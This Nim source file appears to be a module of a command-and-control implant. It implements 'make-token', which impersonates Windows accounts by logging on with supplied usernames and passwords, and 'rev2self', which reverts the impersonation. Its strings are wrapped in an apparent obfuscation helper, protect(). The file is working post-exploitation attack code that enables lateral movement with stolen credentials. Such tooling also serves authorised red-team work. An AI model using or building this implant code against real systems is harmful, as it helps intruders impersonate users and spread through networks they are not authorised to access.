import ../common/[types, utils]

# Define function prototype
proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult 
proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("token"), 
    description: protect("Manipulate Windows access tokens."),
    moduleType: MODULE_TOKEN,
    commands: @[
        Command(
            name: protect("make-token"),
            commandType: CMD_MAKE_TOKEN,
            description: protect("Create an access token from username and password."),
            example: protect("make-token LAB\\john Password123!"),
            arguments: @[
                Argument(name: protect("domain\\username"), description: protect("Account domain and username."), argumentType: STRING, isRequired: true),
                Argument(name: protect("password"), description: protect("Account password."), argumentType: STRING, isRequired: true),
                Argument(name: protect("logonType"), description: protect("Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)."), argumentType: INT, isRequired: false)
            ],
            execute: executeMakeToken
        ),
        Command(
            name: protect("rev2self"),
            commandType: CMD_REV2SELF,
            description: protect("Revert to previous access token."),
            example: protect("rev2self"),
            arguments: @[],
            execute: executeRev2Self
        )
    ]
)  

# Implement execution functions
when not defined(agent):
    proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import winim, strutils, strformat
    import ../agent/protocol/result
    import ../agent/core/token
    import ../common/utils
    
    proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult =  
        try: 
            echo fmt"   [>] Creating access token from username and password."
            
            var success: bool
            var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
            let 
                username = Bytes.toString(task.args[0].data)
                password = Bytes.toString(task.args[1].data)
        
            # Split username and domain at separator '\'
            let userParts = username.split("\\", 1)
            if userParts.len() != 2: 
                raise newException(CatchableError, protect("Expected format domain\\username."))
            
            if task.argCount == 3: 
                logonType = cast[DWORD](Bytes.toUint32(task.args[2].data))
            
            if not makeToken(userParts[1], password, userParts[0], logonType): 
                return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Failed to create token.")))
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            echo fmt"   [>] Reverting access token."

            if not rev2self(): 
                return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])
            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))